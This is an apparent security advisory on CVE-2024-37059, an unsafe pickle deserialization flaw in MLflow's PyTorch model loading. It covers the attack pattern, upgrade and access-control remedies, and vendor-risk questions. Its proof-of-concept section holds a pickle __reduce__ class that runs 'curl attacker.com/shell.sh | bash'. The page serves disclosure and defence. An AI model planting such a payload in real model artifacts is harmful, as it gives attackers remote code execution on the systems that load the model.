# CVE-2024-37059: MLflow PyTorch Model Deserialization RCE

## Quick Reference

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2024-37059 |
| **Framework** | MLflow |
| **Affected Versions** | 0.9.0 to < 2.14.2 |
| **Fixed Version** | 2.14.2 |
| **CVSS Score** | 8.8 (High) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **Attack Vector** | Network (malicious model artifact) |
| **Disclosed** | 2024-06-04 |

## Summary

MLflow's PyTorch model loading functionality is vulnerable to arbitrary code execution through unsafe pickle deserialization. The `_load_model` function in `mlflow/pytorch/__init__.py` uses `torch.load()` without adequate safeguards, allowing an attacker to inject malicious pickle payloads into model artifacts.

This is part of a series of 9 related CVEs (CVE-2024-37052 through CVE-2024-37060) affecting different MLflow model flavors.

## Technical Details

**Vulnerable Function:** `_load_model()` in `mlflow/pytorch/__init__.py`

**Root Cause:** MLflow's PyTorch integration uses `torch.load()` to deserialize model files. Since `torch.load()` relies on Python's pickle module, any malicious pickle object embedded in the model file will be executed during loading.

**Attack Pattern:**
1. Attacker creates a malicious MLflow PyTorch model artifact
2. Malicious pickle payload is embedded in the model's serialized data
3. Victim loads the model using `mlflow.pytorch.load_model()` or `mlflow.pyfunc.load_model()`
4. Arbitrary code executes on the victim's system

**Code Path:**
```python
# Simplified vulnerable flow
def _load_model(path):
    model = torch.load(path)  # Unsafe deserialization
    return model
```

## Proof of Concept

HiddenLayer disclosed this vulnerability in June 2024. The attack involves crafting a PyFunc model with an embedded malicious pickle object.

```python
# Attacker creates malicious model
import mlflow.pytorch
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# Inject into model artifact...

# Victim loads model - RCE occurs
model = mlflow.pytorch.load_model("runs:/abc123/model")
```

## Remediation

### Immediate Actions

1. **Upgrade MLflow to 2.14.2 or later**
   ```bash
   pip install mlflow>=2.14.2 --upgrade
   ```

2. **Audit model sources** - Review all registered models in your MLflow Model Registry for provenance

3. **Restrict model registration** - Limit who can register models in production registries

### Long-term Mitigations

- Implement model signing and verification workflows
- Use network segmentation for MLflow tracking servers
- Consider using safetensors format for PyTorch models in MLflow

## GRC Implications

### Risk Assessment

**Risk Level:** High

**Impact Scenarios:**
- MLflow Model Registry becomes a malware distribution point
- CI/CD pipelines that load models for deployment are compromised
- Data science environments are attacked through shared models
- Model serving infrastructure is compromised

### Vendor Assessment Questions

When evaluating vendors using MLflow:

1. "What version of MLflow do you use?"
2. "How do you manage access control to your Model Registry?"
3. "Do you accept models from external contributors or customers?"
4. "How do you validate model integrity before deployment?"
5. "Are you aware of CVE-2024-37052 through CVE-2024-37060?"

### Related CVEs in MLflow

This is part of a coordinated disclosure. Related vulnerabilities:

| CVE | Component | Affected Flavor |
|-----|-----------|-----------------|
| CVE-2024-37052 | sklearn/__init__.py | scikit-learn |
| CVE-2024-37054 | pyfunc | PyFunc models |
| CVE-2024-37056 | lightgbm/__init__.py | LightGBM |
| CVE-2024-37057 | tensorflow/__init__.py | TensorFlow |
| CVE-2024-37059 | pytorch/__init__.py | PyTorch |
| CVE-2024-37060 | recipes | MLflow Recipes |

### Control Recommendations

| Control | Description | Priority |
|---------|-------------|----------|
| Version upgrade | Upgrade to MLflow >= 2.14.2 | Critical |
| Access control | Restrict Model Registry write access | High |
| Model provenance | Implement model signing | High |
| Network segmentation | Isolate MLflow infrastructure | Medium |
| Audit logging | Enable detailed access logs | Medium |

## References

- [GitHub Issue #12256](https://github.com/mlflow/mlflow/issues/12256)
- [Snyk Advisory](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210331)
- [HiddenLayer Disclosure](https://hiddenlayer.com/innovation-hub/silent-sabotage/)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-37059)

## Timeline

| Date | Event |
|------|-------|
| 2024-06-04 | Vulnerability disclosed by HiddenLayer |
| 2024-06-04 | CVE assigned |
| 2024-06-XX | MLflow 2.14.2 released with fix |
| 2024-09-29 | NVD entry updated |

## Related Vulnerabilities

- [CVE-2025-32434](CVE-2025-32434.md) - Underlying PyTorch torch.load issue
- CVE-2024-37052 through CVE-2024-37060 - Other MLflow flavors

---

*Last updated: 2026-01-18*

*Tags: `mlflow` `pytorch` `model-registry` `high` `rce` `model-loading`*
